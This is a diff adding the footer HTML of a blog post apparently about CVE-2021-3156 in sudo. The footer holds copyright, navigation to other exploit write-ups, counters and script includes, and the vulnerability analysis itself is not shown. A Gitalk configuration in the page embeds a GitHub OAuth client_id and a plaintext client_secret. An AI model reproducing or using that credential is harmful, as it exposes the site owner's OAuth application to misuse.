+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://www.xi4oyu.top/b941c294/" title="CVE-2021-3156">http://www.xi4oyu.top/b941c294/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>欢迎关注我的其它发布渠道</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="/atom.xml">
+          <span class="icon">
+            <i class="fa fa-rss"></i>
+          </span>
+
+          <span class="label">RSS</span>
+        </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/sudo/" rel="tag"># sudo</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/3b546c3b/" rel="prev" title="v8 入门及 starctf-oob 复现">
+                  <i class="fa fa-chevron-left"></i> v8 入门及 starctf-oob 复现
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/696ac724/" rel="next" title="CVE-2019-5782">
+                  CVE-2019-5782 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">feather</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">369k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">5:36</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"featherl","repo":"BlogComment","client_id":"675720f495795eee8627","client_secret":"969c2822176976bcb997f7d6fd07767ce6356043","admin_user":"featherl","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":"zh-CN","js":{"url":"https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"435b7df1aae7a339c7d46ba8b0c75d9d"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
